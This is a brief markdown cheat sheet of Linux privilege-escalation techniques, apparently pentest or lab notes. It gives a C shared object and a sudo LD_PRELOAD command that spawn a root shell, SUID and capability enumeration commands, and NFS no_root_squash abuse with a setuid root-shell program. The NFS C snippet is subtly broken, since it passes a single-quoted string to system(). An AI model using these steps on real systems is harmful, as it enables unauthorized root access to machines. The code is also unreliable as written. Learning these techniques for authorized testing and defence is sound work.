# Here we go!

## Commands abuse  
https://gtfobins.github.io/
  
## Leverage LD_PRELOAD
  1. Check for LD_PRELOAD (with the env_keep option)
       ```
       sudo -l
       ```
     
  3.  Write a simple C code compiled as a share object (.so extension) file
      ```
       //shell.c
       #include <stdio.h>
       #include <sys/types.h>
       #include <stdlib.h>

       void _init() {
         unsetenv("LD_PRELOAD");
         setgid(0); setuid(0);
         system("/bin/bash");
        }
       ```
       ```
       gcc -fPIC -shared -o shell.so shell.c -nostartfiles
       ```
  
  3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
       ```
       sudo LD_PRELOAD=/path/to/shell.so find
       ```
    
## SUID abuse
  1. List files that have SUID or GUID bits set
       ```
       find / -type f -perm -04000 -ls 2>/dev/null
       ```
  2. Use https://gtfobins.github.io/ to find suitable exploitation
  3. Sometimes we will need to find intermediate steps that will help us leverage whatever minuscule finding we have
     
## Capabilities abuse
  1. List enabled capabilities (cap_setuid+ep)
     ```
     getcap -r / 2>/dev/null
     ```
  2.  use https://gtfobins.github.io/ to find suitable exploitation
+ **Crontab abuse**
+ **PATH abuse**
+ **NFS abuse**:
  1. Check for share that has _no_root_squash enabled
     ```
     cat /etc/exports
     ```
  2.  Mount that share on your attacking machine
      ```
      mount -o rw  <target-ip>:/path/to/shared/folder </path/to/local/mount>
      ```
  3.  Create a script that give a root shell with suid or sgid set
      ```
      //nfs.c
      #include <stdio.h>
      #include <sys/types.h>
      #include <stdlib.h>
      int main(){
        setgid(0); setuid(0);
        system('/bin/bash');
        return 0;
      }
      ```
  4.  Execute that script on the target system
